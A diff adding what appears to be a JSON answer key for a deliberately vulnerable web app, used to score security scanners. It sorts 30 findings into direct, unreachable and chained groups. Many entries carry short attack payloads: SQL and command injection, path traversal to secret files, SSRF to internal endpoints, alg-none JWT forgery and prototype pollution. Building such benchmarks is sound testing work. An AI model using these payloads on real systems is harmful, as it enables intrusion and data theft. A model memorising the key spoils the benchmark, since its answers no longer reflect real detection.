@@ -1,0 +1,37 @@
+{
+  "_note": "Answer key. Do NOT feed this file to DAST or Hunt. group A = direct, B = unreachable, C = needs a group A step first.",
+  "findings": [
+    {"id":"A1","group":"A","cwe":"CWE-89","method":"POST","endpoint":"/api/login","param":"username","file":"src/server.js","exploit":"username=admin'-- returns an admin token"},
+    {"id":"A2","group":"A","cwe":"CWE-89","method":"GET","endpoint":"/api/products","param":"q","file":"src/server.js","exploit":"q=' UNION SELECT id,username,password FROM users--"},
+    {"id":"A3","group":"A","cwe":"CWE-78","method":"GET","endpoint":"/api/lookup","param":"host","file":"src/server.js","exploit":"host=x;id"},
+    {"id":"A4","group":"A","cwe":"CWE-22","method":"GET","endpoint":"/api/files","param":"name","file":"src/server.js","exploit":"name=../secrets.env"},
+    {"id":"A5","group":"A","cwe":"CWE-918","method":"GET","endpoint":"/api/fetch","param":"url","file":"src/server.js","exploit":"url=http://127.0.0.1:9091/..."},
+    {"id":"A6","group":"A","cwe":"CWE-95","method":"GET","endpoint":"/api/calc","param":"expr","file":"src/server.js","exploit":"expr=process.version"},
+    {"id":"A7","group":"A","cwe":"CWE-798","method":"GET","endpoint":"/api/debug/env","param":"Authorization","file":"src/server.js","exploit":"basic auth debug:debug"},
+    {"id":"A8","group":"A","cwe":"CWE-306","method":"GET","endpoint":"/api/system/info","param":null,"file":"src/server.js","exploit":"no auth, leaks internalKey"},
+    {"id":"A9","group":"A","cwe":"CWE-434","method":"POST","endpoint":"/api/upload","param":"name","file":"src/server.js","exploit":"upload any file, fetch it from /uploads"},
+    {"id":"A10","group":"A","cwe":"CWE-347","method":"GET","endpoint":"/api/me","param":"Authorization","file":"src/jwt.js","exploit":"Bearer token with alg none and role admin"},
+
+    {"id":"B1","group":"B","cwe":"CWE-89","file":"src/dead/legacy-auth.js","why":"never imported"},
+    {"id":"B2","group":"B","cwe":"CWE-78","file":"src/dead/maintenance.js","why":"never imported"},
+    {"id":"B3","group":"B","cwe":"CWE-94","file":"src/dead/importer.js","why":"never imported"},
+    {"id":"B4","group":"B","cwe":"CWE-22","file":"src/dead/archive.js","why":"never imported"},
+    {"id":"B5","group":"B","cwe":"CWE-327","file":"src/dead/crypto-util.js","why":"never imported"},
+    {"id":"B6","group":"B","cwe":"CWE-601","file":"src/dead/redirect.js","why":"never mounted"},
+    {"id":"B7","group":"B","cwe":"CWE-89","file":"src/db.js","symbol":"legacySearch","why":"exported, never called"},
+    {"id":"B8","group":"B","cwe":"CWE-78","file":"src/server.js","symbol":"runDiagnostics","why":"defined, never called"},
+    {"id":"B9","group":"B","cwe":"CVE-2020-8203","file":"package.json","symbol":"lodash@4.17.15","why":"declared, never imported"},
+    {"id":"B10","group":"B","cwe":"CWE-798","file":"src/dead/old-secrets.js","why":"never imported"},
+
+    {"id":"C1","group":"C","cwe":"CWE-89","method":"GET","endpoint":"/api/admin/export","param":"table","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"table=users"},
+    {"id":"C2","group":"C","cwe":"CWE-22","method":"GET","endpoint":"/api/admin/logs","param":"file","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"file=../../../../etc/passwd"},
+    {"id":"C3","group":"C","cwe":"CWE-94","method":"POST","endpoint":"/api/admin/report","param":"template","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"template=${process.version}"},
+    {"id":"C4","group":"C","cwe":"CWE-94","method":"POST","endpoint":"/api/admin/plugins/load","param":"name","file":"src/admin.js","needs":["A9","A1|A10|A4|A7"],"exploit":"upload plugin.js (A9), then load it"},
+    {"id":"C5","group":"C","cwe":"CWE-79","method":"GET","endpoint":"/api/admin/audit","param":null,"file":"src/admin.js","needs":["A1","A1|A10|A4|A7"],"exploit":"login with username <img src=x onerror=...>, admin opens /audit"},
+    {"id":"C6","group":"C","cwe":"CWE-73","method":"POST","endpoint":"/api/admin/backup","param":"dest","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"dest=/tmp/owned.json"},
+    {"id":"C7","group":"C","cwe":"CWE-918","method":"POST","endpoint":"/api/admin/webhook","param":"url","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"url=http://127.0.0.1:9091/internal/users?key=..."},
+    {"id":"C8","group":"C","cwe":"CWE-78","method":"GET","endpoint":"/internal/run","param":"cmd","file":"src/internal.js","needs":["A5","A8|A7|A4"],"exploit":"SSRF url=http://127.0.0.1:9091/internal/run?key=K&cmd=id"},
+    {"id":"C9","group":"C","cwe":"CWE-328","method":"GET","endpoint":"/internal/users","param":"key","file":"src/internal.js","needs":["A5","A8|A7|A4"],"exploit":"SSRF url=http://127.0.0.1:9091/internal/users?key=K"},
+    {"id":"C10","group":"C","cwe":"CWE-1321","method":"POST","endpoint":"/api/admin/settings","param":"body","file":"src/admin.js","needs":["A1|A10|A4|A7"],"exploit":"{\"__proto__\":{\"isAdminEverywhere\":true}}"}
+  ]
+}
